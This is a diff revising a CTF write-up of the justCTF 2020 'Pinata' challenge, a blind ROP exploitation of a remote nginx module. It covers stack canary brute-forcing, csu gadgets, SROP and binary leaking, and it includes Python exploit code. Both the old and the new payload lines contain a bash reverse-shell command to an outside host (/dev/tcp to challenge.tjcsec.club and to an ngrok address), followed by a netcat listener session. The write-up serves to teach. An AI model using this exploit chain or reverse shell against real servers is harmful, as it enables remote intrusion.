@@ -5,7 +5,7 @@ slug: /writeups/justctf-2020-pinata
 excerpt: Blind exploitation of nginx from justCTF 2020
 ---
 
-Pinata was a binary exploitation challenge from justCTF 2020. The task was to exploit a remote nginx service running a custom module, _without_ a provided binary. I competed with DiceGang and completed this challenge with kmh (who did most of the important work) over the course of at least 14 hours. At the end of the CTF, only 2 teams solved this challenge.
+Pinata was a binary exploitation challenge from justCTF 2020. The task was to exploit a remote nginx service running a custom module, _without_ a provided binary. I competed with DiceGang and completed this challenge with kmh over the course of at least 14 hours. We managed to secure first blood 🩸, and at the end of the CTF only 2 teams solved this challenge.
 
 # Description
 > The real target is an nginx server with a custom module. It's sitting behing a proxy (also nginx) so teams can solve the challenge in isolation. Please don't try to hack the proxy or abuse it, it's not part of the challenge.
@@ -40,7 +40,7 @@ The overarching steps are as follows, and I'll go through each of them in more d
 6. use leaked binary to develop full exploit
 
 # Stack Reads
-The binary is likely compiled with stack canaries and is position-independent. We must bypass both of these protections first. As mentioned in the paper, many servers fork a child process for each request for performance. Since child processes inherit the parent's address space, each one will have the same (but still random) addresses and stack canary. Thus, we can overflow one byte at a time, trying each byte from 0 to 256 until we do not get a crash. With this technique, we can leak both the stack canary and the function's return address.
+The binary is likely compiled with stack canaries and is position-independent. We must bypass both of these protections first. As mentioned in the paper, many servers fork a child process for each request for performance. Since child processes inherit the parent's address space, each one will have the same (but still random) addresses and stack canary. Thus, we can overflow one byte at a time, trying each byte from 0 to 255 until we do not get a crash. With this technique, we can leak both the stack canary and the function's return address.
 
 In order to have more control over what we are sending, we will be using a raw pwntools socket rather than something like `requests`.
 
@@ -63,6 +63,8 @@ Authorization: Basic {}\r
 
 The code to do the byte-by-byte brute force is shown below.
 ```python
+username = b'A'
+
 def bash_stack():
   password = b''
   while len(password) < 46:
@@ -155,7 +157,7 @@ Dump of assembler code for function __libc_csu_init:
 
 We would like to find this gadget for a few reasons:
 - it is present in every binary linked with glibc (and this one is)
-- it allows us to control `rdi` and `rsi`, the registers used for the first to arguments in a function call
+- it allows us to control `rdi` and `rsi`, the registers used for the first two arguments in a function call
 
 Disassembling at offsets +7 and +9 from the first instruction above produces the ubiquitous `pop rsi; pop r15; ret` and `pop rdi; ret` gadgets that we are familiar with (side note: this is why they are almost everywhere!). The general procedure for finding this gadget is to look for an address that pops six values off the stack. Then, we must further verify it by testing offsets from that address (since popping six values off the stack does not necessarily mean we have found the right gadget).
 
@@ -216,6 +218,8 @@ Now that we have the ability to control the first two function arguments, we wan
 
 This last observation proved to be the most helpful. In the binary I pulled, `__libc_csu_init` was `0xcc310` after the first PLT entry, or `0xcc340` after the start of the page containing the PLT. After much searching, kmh found the address `0xc2d00` before the leaked return address (`0xc2f32` before the csu gadget) was most likely the page containing the PLT.
 
+In hindsight, we can not be sure that this is actually the start of the PLT. But, we can be reasonably sure that this is at least somewhere in the middle.
+
 # Leaking the Binary
 The next step is to leak the binary with a `write`.
 
@@ -223,7 +227,7 @@ The next step is to leak the binary with a `write`.
 Up to this point we have mostly followed the paper. However, we deviate here. Since the nginx binary is so complex, it contains much more powerful functions in the PLT. Our target was to find `syscall@plt`, since this would allow us to make arbitrary syscalls with less gadgets than the paper requires. Note that the first argument to `syscall` is the syscall number, which we can control through `rdi`. kmh came up with a clever technique to determine which PLT function was `syscall`. By carefully selecting some syscall numbers that were guaranteed to succeed or fail, he was able to narrow it down to just one function.
 
 - `SYS_getuid` and similar syscalls (like `SYS_getgid`) should always succeed and require no arguments. The first step is putting the syscall number for this syscall in `rdi` and returning to some multiple of `0x10` after the start of the PLT, followed by the stop gadget. Every function that succeeds (and produces a stop) is a potential candidate for `syscall`.
-- `SYS_exit` should terminate the child process and give us a 502. Thus we place the number for `SYS_exit` in `rdi` and retry all of our candidates. The one that crashes should be `syscall`.
+- `SYS_exit` should terminate the child process and give us a 502. Thus, we place the number for `SYS_exit` in `rdi` and retry all of our candidates. The one that crashes should be `syscall`.
 
 This technique proved to be extremely effective, producing just one possible function. `syscall` ended up being at offset `0xa0` from the start of the PLT page.
 
@@ -238,11 +242,24 @@ We can start at fd 3, because fd 0, 1, and 2 are typically stdin, stdout, and st
 ## Making Arbitrary Syscalls
 The paper recommends that we find the address of `strcmp` in order to set `rdx`. However, this process is tricky and very guessy. We also need to control even more arguments later, which would be a big pain. To get around this, we will use a technique called Sigreturn-Oriented Programming. This technique only requires that we control the syscall number, and it allows us to set _every_ register, including `rip`! You can read more about this technique [here](https://amriunix.com/post/sigreturn-oriented-programming-srop/).
 
+Since we found the csu gadget before, it was tempting to try return to csu to control `rdx`. However, there are two problems with this:
+
+- There are at least two variants of `__libc_csu_init`, one of them has `call QWORD PTR [r12+rbx*8]` and the other has `call QWORD PTR [r15+rbx*8]`. It is impossible to know which one we have.
+- We would need to create a function pointer or find the GOT, which would be a waste of time.
+
 ## Writing the Binary
 We know that the first bytes of a binary are always `b'\x7fELF'`. We can use this fact to find the start of the binary in memory with trial and error. We use SROP to make a `write` syscall, and check to see if the beginning of the output is what we expect. We have a general sense of where this should be by inspecting our nginx binary. The start turns out to be `0x2b000` lower than the start of the PLT.
 
 ```python
-# trial and error
+csu = ret + 0x232
+# print(check_csu(csu))
+
+rdi = csu + 9
+rsi_r15 = csu + 7
+
+plt = ret - 0xc2d00
+syscall = plt + 10*0x10
+
 exe = plt - 0x2b000
 
 def leak_some(addr):
@@ -279,9 +296,9 @@ At this point we have enough information to complete the exploit. The dumped bin
 The second gadget is particularly powerful. Not only does it allow us to write data to memory, but it also allows us to write the return value of a function in `rax` to memory, which turned out to be very helpful.
 
 ## kmh's Solution
-kmh's solution came as a result of us asking where the flag should be (file, environment, memory, etc.) An admin told us that the flag was in the file `/flag.txt`, and that this path would be added to the challenge description. kmh's solution was to `open` this file, then use `sendfile` to send it to our socket.
+kmh's solution came as a result of us asking where the flag should be (file, environment, memory, etc.) An admin told us that the flag was in the file `/flag.txt`, and that this path would be added to the challenge description. kmh's solution was to `open` this file, then `read` and `write` it to our socket. I suggested `sendfile` rather than `read` and `write` to save a syscall.
 
-We can use the second gadget above to write the filename to memory, then `open` it. But how do we get the returned file descriptor? We could just use guess-and-check, but kmh used the gadget to write the returned value in `rax` to memory, then used `write` to write it back to us. The value turned out to be `12`, so we can finish with the `sendfile`.
+We can use the second gadget above to write the filename to memory, then `open` it. But how do we get the returned file descriptor? We could just use guess-and-check, but kmh used the gadget to write the returned value in `rax` to memory, then used `write` to send the value back. The value turned out to be `12`, so we can finish with the `sendfile`.
 
 ```python
 rax = exe + 0x97232
@@ -338,12 +355,11 @@ www = exe + 0x9f158
 
 buf = exe + 0x129000
 # the 4 values below are argv array pointers
-data = p64(buf + 4*8)     # /bin/sh
-data += p64(buf + 4*8+8)  # -c
-data += p64(buf + 4*8+11) # /bin/bash -c ...
-data += p64(0)            # NULL
-# actual strings
-data += b'/bin/sh\x00-c\x00/bin/bash -c \'/bin/sh -i >& /dev/tcp/challenge.tjcsec.club/1337 0>&1\'\x00'
+data = p64(buf + 4*8)       # /bin/bash
+data += p64(buf + 4*8+10)   # -c
+data += p64(buf + 4*8+13)   # /bin/bash -i >& ...
+data += p64(0)              # NULL
+data += b'/bin/bash\x00-c\x00/bin/bash -i >& /dev/tcp/2.tcp.ngrok.io/14571 0>&1\x00'
 
 rop = password
 for i in range(0, len(data), 8):
@@ -370,16 +386,14 @@ rop += bytes(frame)
 send_stuff(rop).recv()
 ```
 
-We need to set `PATH` after receiving the reverse shell because the sandboxed process does not inherit environment variables.
-
+Since we set `envp` to NULL, the shell does not have any environment variables (so no `PATH`). We can either `export PATH=/bin` or just use absolute paths to `ls` and `cat`.
 ```
 $ nc -nlvp 1337
 Listening on 0.0.0.0 1337
-Connection received on 104.248.193.133 45114
-sh: cannot set terminal process group (1): Inappropriate ioctl for device
-sh: no job control in this shell
-sh-4.4$ export PATH=/bin
-sh-4.4$ ls
+Connection received on 127.0.0.1 42784
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-4.4$ /bin/ls
 bin
 default.script
 dev
@@ -394,9 +408,9 @@ share
 sys
 tmp
 var
-sh-4.4$ cat flag.txt
+bash-4.4$ /bin/cat flag.txt
 justCTF{n0_n33d_4_p455w0rd_wh3n_h4ckin9_b1ind_th3_wh0l3_s3rv3r_c0ngr4t5!}
-sh-4.4$
+bash-4.4$
 ```
 
 # Final Thoughts
